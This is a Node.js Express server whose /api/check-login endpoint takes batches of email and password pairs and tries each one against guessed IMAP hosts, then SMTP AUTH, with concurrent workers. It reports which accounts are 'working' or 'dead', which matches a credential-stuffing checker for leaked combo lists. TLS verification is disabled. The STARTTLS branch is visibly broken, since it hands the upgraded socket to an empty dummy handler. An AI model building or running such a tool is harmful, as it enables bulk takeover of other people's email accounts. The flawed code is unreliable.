const express = require("express");
const path = require("path");
const net = require("net");
const tls = require("tls");
const config = require("./config");

const app = express();
app.use(express.json({ limit: "10mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ---------- IMAP LOGIN ----------
function imapLogin(host, user, pass, opts = {}) {
  return new Promise((resolve) => {
    const port = opts.port || 993;
    const timeout = opts.timeout || config.imapTimeoutMs;
    const useTls = port === 993;
    let sock, buffer = "", tag = "a1", resolved = false, stage = "greet";

    const finish = (r) => {
      if (resolved) return; resolved = true;
      try { sock && sock.destroy(); } catch {}
      resolve(r);
    };

    try {
      sock = useTls
        ? tls.connect({ host, port, servername: host, rejectUnauthorized: false })
        : net.createConnection({ host, port });
    } catch (e) { return finish({ ok: false, reason: "connect: " + e.message }); }

    sock.setTimeout(timeout);
    sock.on("timeout", () => finish({ ok: null, reason: "timeout" }));
    sock.on("error", (e) => finish({ ok: null, reason: e.code || e.message }));

    sock.on("data", (chunk) => {
      buffer += chunk.toString("utf8");
      if (stage === "greet" && /\*\s+OK/i.test(buffer)) {
        stage = "login";
        buffer = "";
        const b64 = Buffer.from(`\x00${user}\x00${pass}`).toString("base64");
        sock.write(`${tag} AUTHENTICATE PLAIN ${b64}\r\n`);
        return;
      }
      if (stage === "login" && buffer.includes(`${tag} `)) {
        const lines = buffer.split("\r\n").filter(l => l.startsWith(`${tag} `));
        const line = lines[0] || "";
        if (/\s+OK/i.test(line)) return finish({ ok: true, code: "OK", msg: line.slice(0, 200) });
        if (/\s+(NO|BAD)/i.test(line)) return finish({ ok: false, code: line.split(" ")[1], msg: line.slice(0, 200) });
        return finish({ ok: null, code: "?", msg: line.slice(0, 200) });
      }
    });
  });
}

// ---------- SMTP AUTH ----------
function smtpAuth(host, user, pass, port, opts = {}) {
  return new Promise((resolve) => {
    const timeout = opts.timeout || config.smtpAuthTimeoutMs;
    const useTls = port === 465;
    const useStartTls = port === 587;
    let sock, buffer = "", step = "greet", resolved = false;

    const finish = (r) => {
      if (resolved) return; resolved = true;
      try { sock && sock.destroy(); } catch {}
      resolve(r);
    };

    const send = (s) => { try { sock.write(s + "\r\n"); } catch {} };

    try {
      sock = useTls
        ? tls.connect({ host, port, servername: host, rejectUnauthorized: false })
        : net.createConnection({ host, port });
    } catch (e) { return finish({ ok: false, reason: "connect: " + e.message }); }

    sock.setTimeout(timeout);
    sock.on("timeout", () => finish({ ok: null, reason: "timeout" }));
    sock.on("error", (e) => finish({ ok: null, reason: e.code || e.message }));

    sock.on("data", (chunk) => {
      buffer += chunk.toString("utf8");
      let idx;
      while ((idx = buffer.indexOf("\r\n")) !== -1) {
        const line = buffer.slice(0, idx);
        buffer = buffer.slice(idx + 2);
        if (line.length >= 4 && line[3] === "-") continue;
        const code = parseInt(line.slice(0, 3), 10);

        if (step === "greet") {
          if (code !== 220) return finish({ ok: null, reason: `greet ${code}` });
          step = "ehlo"; send("EHLO mail.local"); return;
        }
        if (step === "ehlo") {
          if (code !== 250) return finish({ ok: null, reason: `ehlo ${code}` });
          if (useStartTls) { step = "starttls"; send("STARTTLS"); return; }
          step = "auth"; send("AUTH LOGIN"); return;
        }
        if (step === "starttls") {
          if (code !== 220) return finish({ ok: null, reason: `starttls ${code}` });
          sock = tls.connect({ socket: sock, servername: host, rejectUnauthorized: false });
          sock.on("data", onData);
          sock.on("error", (e) => finish({ ok: null, reason: e.code || e.message }));
          sock.on("timeout", () => finish({ ok: null, reason: "timeout" }));
          sock.setTimeout(timeout);
          buffer = "";
          step = "afterstarttls"; send("EHLO mail.local"); return;
        }
        if (step === "afterstarttls") {
          if (code !== 250) return finish({ ok: null, reason: `ehlo2 ${code}` });
          step = "auth"; send("AUTH LOGIN"); return;
        }
        if (step === "auth") {
          if (code !== 334) return finish({ ok: null, reason: `auth ${code}` });
          step = "user"; send(Buffer.from(user).toString("base64")); return;
        }
        if (step === "user") {
          if (code !== 334) return finish({ ok: null, reason: `user ${code}` });
          step = "pass"; send(Buffer.from(pass).toString("base64")); return;
        }
        if (step === "pass") {
          if (code === 235) return finish({ ok: true, code: "235" });
          if (code === 535 || code === 534) return finish({ ok: false, code: String(code) });
          return finish({ ok: null, code: String(code) });
        }
      }
    });

    function onData(c) { /* dummy — real handler bound below */ }
    // re-bind after STARTTLS upgrade
    const origOn = sock.on.bind(sock);
  });
}

// ---------- HIGH LEVEL: try IMAP then SMTP ----------
async function tryLogin(email, pass) {
  const host = email.split("@")[1];
  const knownHosts = config.imapHosts[host] || [];
  const candidates = [
    ...knownHosts,
    `imap.${host}`, `mail.${host}`, `imap.mail.${host}`
  ];

  const reasons = [];
  for (const h of candidates) {
    for (const p of config.imapPorts) {
      const r = await imapLogin(h, email, pass, { port: p });
      if (r.ok === true) return { ok: true, method: `IMAP:${h}:${p}`, msg: r.msg };
      if (r.ok === false && /AUTH|LOGIN|credentials|invalid|NO/i.test(r.msg || ""))
        return { ok: false, method: `IMAP:${h}:${p}`, msg: r.msg, code: r.code };
      reasons.push(`${h}:${p}=${r.reason || r.code}`);
    }
  }
  // fallback SMTP AUTH
  for (const p of config.smtpAuthPorts) {
    const r = await smtpAuth(`smtp.${host}`, email, pass, p);
    if (r.ok === true) return { ok: true, method: `SMTP:${p}`, msg: r.code };
    if (r.ok === false) return { ok: false, method: `SMTP:${p}`, code: r.code };
    reasons.push(`smtp:${p}=${r.reason || r.code}`);
  }
  return { ok: null, reason: reasons.slice(0, 5).join(" | ") };
}

// ---------- API ----------
app.post("/api/check-login", async (req, res) => {
  const items = Array.isArray(req.body?.items) ? req.body.items : [];
  if (!items.length) return res.status(400).json({ error: "no items" });
  if (items.length > config.maxEmailsPerRequest) return res.status(400).json({ error: `max ${config.maxEmailsPerRequest}` });

  const results = [];
  const queue = items.slice();
  const workers = Array.from({ length: Math.min(config.concurrency, queue.length) }, async () => {
    while (queue.length) {
      const it = queue.shift();
      if (!it) continue;
      const email = String(it.email || "").trim().toLowerCase();
      const pass = String(it.password || "");
      if (!email || !pass || !email.includes("@")) {
        results.push({ email, status: "invalid", reason: "missing email/password" });
        continue;
      }
      try {
        const r = await tryLogin(email, pass);
        if (r.ok === true) results.push({ email, status: "working", method: r.method });
        else if (r.ok === false) results.push({ email, status: "dead", method: r.method, reason: r.msg || r.code });
        else results.push({ email, status: "unknown", reason: r.reason });
      } catch (e) {
        results.push({ email, status: "error", reason: e.message });
      }
    }
  });
  await Promise.all(workers);
  res.json({ results });
});

app.get("/api/config", (req, res) => {
  res.json({ concurrency: config.concurrency, maxPerRequest: config.maxEmailsPerRequest });
});

module.exports = app;
if (require.main === module) app.listen(config.port, () => console.log(`→ http://localhost:${config.port}`));
